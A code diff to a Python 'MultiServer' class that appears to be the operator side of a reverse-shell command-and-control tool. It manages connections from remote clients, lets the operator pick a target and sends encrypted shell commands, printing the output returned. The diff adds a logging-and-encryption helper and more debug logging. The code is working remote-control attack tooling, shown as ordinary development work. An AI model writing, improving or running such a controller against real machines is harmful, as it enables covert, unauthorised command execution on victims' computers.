@@ -127,12 +127,21 @@ class MultiServer(object):
                 print('Command not recognized')
         return
 
+    def log(self, data : str, encrypt=True):
+        logging.debug(f'Sending: {data}')
+        data = data.encode()
+        if encrypt:
+            data = self.Crypt.encrypt(data)
+            logging.debug(data)
+        return data
+        
+
     def list_connections(self):
         """ List all connections """
         results = ''
         for i, conn in enumerate(self.all_connections):
             try:
-                conn.send(str.encode(' '))
+                conn.send(self.log(' '))
                 conn.recv(20480)
             except:
                 del self.all_connections[i]
@@ -151,12 +160,12 @@ class MultiServer(object):
         try:
             target = int(target)
         except:
-            logging.warning('Client index should be an integer')
+            logging.error('Client index should be an integer')
             return None, None
         try:
             conn = self.all_connections[target]
         except IndexError:
-            logging.warning('Not a valid selection')
+            logging.error('Not a valid selection')
             return None, None
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
@@ -191,15 +200,16 @@ class MultiServer(object):
         :param conn: 
         :param target: 
         """
-        conn.send(self.Crypt.encrypt(b" "))
+        conn.send(self.log(" "))
         cwd_bytes = self.Crypt.decrypt(self.read_command_output(conn))
         cwd = str(cwd_bytes, "utf-8")
+        logging.debug(f'Received: {cwd}')
         print(cwd, end="")
         while True:
             try:
                 cmd = input()
                 if len(str.encode(cmd)) > 0:
-                    conn.send(self.Crypt.encrypt(cmd.encode()))
+                    conn.send(self.log(cmd))
                     received = self.read_command_output(conn)
                     logging.debug(f'"{received}"')
                     cmd_output = self.Crypt.decrypt(received)
